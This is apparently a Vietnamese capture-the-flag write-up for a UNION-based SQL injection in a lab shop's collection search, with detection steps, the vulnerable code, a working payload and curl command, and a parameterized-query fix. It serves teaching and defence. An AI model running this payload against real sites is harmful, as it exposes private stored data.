# 01 · SQL Injection (UNION) — Tìm bộ sưu tập

| | |
|---|---|
| **Khu vực** | Ô "Tìm bộ sưu tập" · `GET /collections/search?q=` |
| **Cần đăng nhập** | Không |
| **Flag nằm ở** | `collection_notes.note` trong `catalog.sqlite3` |
| **Script** | [`exploits/sqli.py`](exploits/sqli.py) |

## 1. Nhận dạng (black-box)

- Trang `/collections` liệt kê các bộ sưu tập; có ô tìm theo tên dẫn tới `/collections/search?q=...`.
- Nhập một dấu nháy đơn `'` vào ô tìm: `GET /collections/search?q='` → trang trả về bất thường
  (kết quả rỗng/khác lạ) thay vì xử lý sạch, gợi ý chuỗi nhập được ghép thẳng vào SQL.
- Nhập `x%' --` mà vẫn ra kết quả "hợp lệ" ⇒ xác nhận chuỗi `q` đóng được mệnh đề `LIKE` và
  phần còn lại của câu bị comment ⇒ **SQL injection dạng chuỗi trong mệnh đề `LIKE`**.

## 2. Phân tích mã nguồn

[`sandbox/app/app.py`](../sandbox/app/app.py) · hàm `collection_search` (≈ dòng 213–226):

```python
q = request.args.get("q", "")[:160]
with connect(catalog_path) as db:
    if patched("sqli"):
        sql = "SELECT id,title,description FROM collections WHERE title LIKE ?"
        rows = db.execute(sql, ("%" + q + "%",)).fetchall()
    else:
        sql = "SELECT id,title,description FROM collections WHERE title LIKE '%" + q + "%'"
        rows = db.execute(sql).fetchall()      # <-- NỐI CHUỖI: lỗ hổng
```

- Nhánh chưa vá ghép `q` trực tiếp vào câu SQL ⇒ kiểm soát được cấu trúc truy vấn.
- Câu gốc chọn **3 cột** `(id, title, description)`; cột `title` được in trong thẻ `<h2>` của
  thẻ bộ sưu tập ([`templates/shop.html`](../sandbox/app/templates/shop.html) dòng 221).
- Truy vấn chạy trên `catalog.sqlite3`, trong đó có bảng `collection_notes(... , note, ...)` —
  **đúng nơi checker cắm flag** (ghi chú riêng của khách về bộ sưu tập).

> Lưu ý phạm vi: `catalog.sqlite3` tách riêng khỏi `shop.sqlite3`, nên SQLi này **không**
> đọc được đơn hàng/ưu đãi VIP/bản đối soát — chỉ chạm được dữ liệu trong catalog.

## 3. Khai thác thủ công

Dùng `UNION SELECT` để đưa cột `note` vào vị trí cột `title` (cột thứ 2) cho khớp 3 cột:

```
zzz%' UNION SELECT id, note, user_id FROM collection_notes-- -
```

Ghép vào truy vấn, câu trở thành:

```sql
SELECT id,title,description FROM collections
WHERE title LIKE '%zzz%' UNION SELECT id, note, user_id FROM collection_notes-- -%'
```

- `zzz%'` khớp rỗng (không có bộ sưu tập tên "zzz") ⇒ chỉ còn các hàng từ `collection_notes`.
- `-- -` comment phần `%'` còn lại của câu gốc.
- Mỗi `note` hiện ra trong một thẻ `<h2>` ⇒ các flag lộ ra trên trang.

Bằng `curl` (nhớ URL-encode):

```bash
curl -s "http://10.90.0.12/collections/search" \
  --get --data-urlencode "q=zzz%' UNION SELECT id, note, user_id FROM collection_notes-- -" \
  | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```

## 4. Script tự động

[`exploits/sqli.py`](exploits/sqli.py) gửi đúng payload trên, bóc nội dung các thẻ `<h2>`,
`html.unescape` rồi lọc theo regex flag:

```bash
python sqli.py http://10.90.0.12
```

## 5. Bản vá

Bật khóa `sqli` để chuyển sang truy vấn **tham số hóa** (placeholder `?`):

```json
{"sqli": true}
```

Nhánh đã vá dùng `WHERE title LIKE ?` với tham số `"%"+q+"%"` ⇒ chuỗi nhập chỉ còn là **dữ
liệu**, không thể đổi cấu trúc truy vấn. (Chi tiết bật patch: [PATCHES.md](PATCHES.md).)

**Tự kiểm chứng sau vá:**
- Tìm theo tên bộ sưu tập thật (vd. một từ trong tiêu đề) vẫn trả đúng kết quả → chức năng còn nguyên.
- Payload UNION ở trên trả **0 flag** (không còn hàng `collection_notes` nào lộ ra).
- Checker SQLi vẫn UP (nó kiểm tra tìm kiếm hợp lệ + đọc lại ghi chú của chính chủ).
